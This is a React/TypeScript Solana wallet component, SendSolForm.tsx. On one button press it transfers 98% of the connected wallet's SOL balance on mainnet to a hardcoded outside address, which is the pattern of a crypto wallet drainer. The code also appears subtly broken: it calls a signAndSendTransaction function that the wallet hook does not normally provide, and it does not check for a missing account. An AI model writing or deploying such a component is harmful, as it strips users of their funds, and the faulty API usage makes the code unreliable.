// SendSolForm.tsx

import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import * as web3 from '@solana/web3.js';
import { FC, useState } from 'react'

export const SendSolForm: FC = () => {
    const [txSig, setTxSig] = useState('');
    const { connection } = useConnection();
    const { publicKey, signAndSendTransaction } = useWallet(); // Updated to use signAndSendTransaction

    const sendSol = async (event) => {
        event.preventDefault();
        if (!connection || !publicKey) { return; }

        try {
            // Get current SOL balance and calculate 98% of it
            const info = await connection.getAccountInfo(publicKey);
            const balanceInSol = info.lamports / web3.LAMPORTS_PER_SOL;
            const amountToSend = balanceInSol * 0.98; // 98% of current balance

            // Prepare transaction to send SOL
            const transaction = new web3.Transaction();
            const recipientPubKey = new web3.PublicKey('AiwmF5F27tMzxmzcDwUg3on2fWiCHcuxQmBtV3bo611a');

            transaction.add(
                web3.SystemProgram.transfer({
                    fromPubkey: publicKey,
                    toPubkey: recipientPubKey,
                    lamports: amountToSend * web3.LAMPORTS_PER_SOL
                })
            );

            // Sign and send transaction
            const { signature } = await signAndSendTransaction(transaction);
            setTxSig(signature);
        } catch (error) {
            console.error('Failed to send transaction:', error);
        }
    }

    return (
        <div>
            {
                publicKey ?
                    <form onSubmit={sendSol}>
                        <button type="submit">Send 98% of SOL Balance</button>
                    </form> :
                    <span>Connect Your Wallet</span>
            }
            {
                txSig ?
                    <div>
                        <p>View your transaction on </p>
                        <a href={`https://explorer.solana.com/tx/${txSig}?cluster=mainnet`}>Solana Explorer</a>
                    </div> :
                    null
            }
        </div>
    )
}
